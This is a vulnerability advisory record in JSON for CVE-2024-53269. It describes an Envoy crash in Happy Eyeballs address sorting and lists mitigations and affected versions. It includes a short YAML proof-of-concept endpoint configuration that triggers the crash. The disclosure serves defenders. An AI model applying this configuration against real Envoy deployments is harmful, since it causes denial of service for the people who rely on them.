{
  "modified": "2024-12-18T16:08:16Z",
  "published": "2024-12-18T16:08:16Z",
  "schema_version": "1.5.0",
  "id": "CVE-2024-53269",
  "aliases": [
    "GHSA-mfqp-7mmj-rm53"
  ],
  "details": "### Details\r\n\r\nWhen additional address are not ip addresses, then the Happy Eyeballs sorting algorithm will crash in data plane. This CVE will validate all additional and original addresses are IP addresses.\r\n\r\n### PoC\r\n\r\n```yaml\r\n- clusterName: outbound|80||echo.default.svc.cluster.local\r\n  endpoints:\r\n  - lbEndpoints:\r\n    - endpoint:\r\n        additionalAddresses:\r\n        - address:\r\n            envoyInternalAddress:\r\n              endpointId: '[fd00:10:244::10]:80'\r\n              serverListenerName: connect_originate\r\n        address:\r\n          envoyInternalAddress:\r\n            endpointId: [10.244.0.16:80](http://10.244.0.16/)\r\n            serverListenerName: connect_originate\r\n        healthCheckConfig: {}\r\n      healthStatus: HEALTHY\r\n      loadBalancingWeight: 1\r\n      metadata:\r\n        filterMetadata:\r\n          envoy.filters.listener.original_dst:\r\n            local: [10.244.0.16:80](http://10.244.0.16/)\r\n          envoy.transport_socket_match:\r\n            tunnel: http\r\n          istio:\r\n            workload: echo;default;echo;;Kubernetes\r\n    loadBalancingWeight: 1\r\n    locality: {}\r\n  policy:\r\n    overprovisioningFactor: 140\r\n```\r\n\r\n### Mitigation\r\n* Disable Happy Eyeballs\r\n* Change the IP configuration\r\n\r\n### Impact\r\nIt will crash envoy.\r\n",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "envoy",
        "purl": "pkg:dhi/envoy"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "1.30.0"
            },
            {
              "fixed": "1.30.8"
            },
            {
              "introduced": "1.31.0"
            },
            {
              "fixed": "1.31.4"
            },
            {
              "introduced": "1.32.0"
            },
            {
              "fixed": "1.32.2"
            }
          ]
        }
      ],
      "database_specific": {
        "source_ecosystem": "",
        "source_package": "Envoy"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-mfqp-7mmj-rm53"
    }
  ]
}